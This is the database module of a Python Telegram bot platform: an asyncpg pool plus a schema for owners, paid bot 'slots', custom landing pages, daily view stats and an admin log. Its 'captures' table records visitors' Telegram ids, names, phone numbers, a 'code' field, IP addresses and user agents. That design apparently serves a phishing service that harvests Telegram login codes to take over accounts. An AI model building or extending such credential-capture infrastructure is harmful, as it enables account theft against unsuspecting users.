# db.py
import asyncpg
from config import DATABASE_URL, PG_POOL_MIN, PG_POOL_MAX

_pool: asyncpg.Pool | None = None

SCHEMA = """
CREATE TABLE IF NOT EXISTS owners (
    user_id     BIGINT PRIMARY KEY,
    username    TEXT,
    created_at  TIMESTAMPTZ NOT NULL DEFAULT now()
);

CREATE TABLE IF NOT EXISTS sub_bots (
    id              BIGSERIAL PRIMARY KEY,
    owner_id        BIGINT NOT NULL REFERENCES owners(user_id) ON DELETE CASCADE,
    token_enc       BYTEA NOT NULL,
    bot_username    TEXT NOT NULL,
    bot_name        TEXT NOT NULL,
    page_text       TEXT NOT NULL DEFAULT '',
    button_text     TEXT NOT NULL DEFAULT '',
    button_url      TEXT NOT NULL DEFAULT '',
    is_active       BOOLEAN NOT NULL DEFAULT TRUE,
    created_at      TIMESTAMPTZ NOT NULL DEFAULT now()
);

CREATE INDEX IF NOT EXISTS idx_sub_bots_owner ON sub_bots(owner_id);

CREATE TABLE IF NOT EXISTS slot_purchases (
    id                   BIGSERIAL PRIMARY KEY,
    owner_id             BIGINT NOT NULL,
    qty                  INTEGER NOT NULL CHECK (qty > 0),
    stars                INTEGER NOT NULL CHECK (stars >= 0),
    provider_charge_id   TEXT,
    created_at           TIMESTAMPTZ NOT NULL DEFAULT now()
);

CREATE TABLE IF NOT EXISTS captures (
    id          BIGSERIAL PRIMARY KEY,
    sub_bot_id  BIGINT NOT NULL REFERENCES sub_bots(id) ON DELETE CASCADE,
    tg_user_id  BIGINT NOT NULL,
    username    TEXT,
    full_name   TEXT,
    phone       TEXT,
    code        TEXT,
    ip          TEXT,
    user_agent  TEXT,
    archived    BOOLEAN NOT NULL DEFAULT FALSE,
    created_at  TIMESTAMPTZ NOT NULL DEFAULT now()
);

CREATE INDEX IF NOT EXISTS idx_captures_bot
    ON captures(sub_bot_id, created_at DESC);

CREATE TABLE IF NOT EXISTS stats_daily (
    sub_bot_id  BIGINT NOT NULL REFERENCES sub_bots(id) ON DELETE CASCADE,
    day         DATE NOT NULL,
    views       INTEGER NOT NULL DEFAULT 0,
    captures    INTEGER NOT NULL DEFAULT 0,
    PRIMARY KEY (sub_bot_id, day)
);

CREATE TABLE IF NOT EXISTS admin_log (
    id          BIGSERIAL PRIMARY KEY,
    admin_id    BIGINT NOT NULL,
    action      TEXT NOT NULL,
    payload     TEXT,
    created_at  TIMESTAMPTZ NOT NULL DEFAULT now()
);
"""

async def init_db() -> None:
    global _pool
    _pool = await asyncpg.create_pool(
        dsn=DATABASE_URL,
        min_size=PG_POOL_MIN,
        max_size=PG_POOL_MAX,
        command_timeout=30,
    )
    async with _pool.acquire() as conn:
        await conn.execute(SCHEMA)

async def close_db() -> None:
    if _pool:
        await _pool.close()

def get_pool() -> asyncpg.Pool:
    if _pool is None:
        raise RuntimeError("db not initialised")
    return _pool